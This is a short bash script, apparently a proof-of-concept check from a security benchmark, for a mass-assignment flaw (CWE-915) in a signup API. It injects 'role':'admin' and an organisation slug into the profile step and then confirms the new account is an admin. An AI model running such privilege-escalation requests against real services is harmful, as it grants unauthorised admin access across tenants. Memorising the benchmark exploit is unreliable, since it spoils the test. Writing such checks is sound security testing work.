#!/usr/bin/env bash
# SIGNUP-MASSASSIGN-001 (CWE-915): the profile step spreads the request body into
# the draft, so registration can name its own role and tenant. Proven end to end:
# the finished account really is an admin.
set -e; . "$(dirname "$0")/_lib.sh"
EMAIL="escalate-$$@bench.local"
DRAFT=$(curl -s -X POST "$TARGET/api/signup/start" -H 'content-type: application/json' \
  -d "{\"email\":\"$EMAIL\"}" | json_get draftId)
[ -n "$DRAFT" ]
# smuggle role/orgSlug through the profile step, then finish
curl -s -X POST "$TARGET/api/signup/profile" -H 'content-type: application/json' \
  -d "{\"draftId\":$DRAFT,\"displayName\":\"Mallory\",\"role\":\"admin\",\"orgSlug\":\"globex\"}" >/dev/null
curl -s -X POST "$TARGET/api/signup/complete" -H 'content-type: application/json' \
  -d "{\"draftId\":$DRAFT,\"password\":\"Escalate123!\"}" >/dev/null
# the account that got created is a real admin
[ "$(user_role "$EMAIL")" = "admin" ]
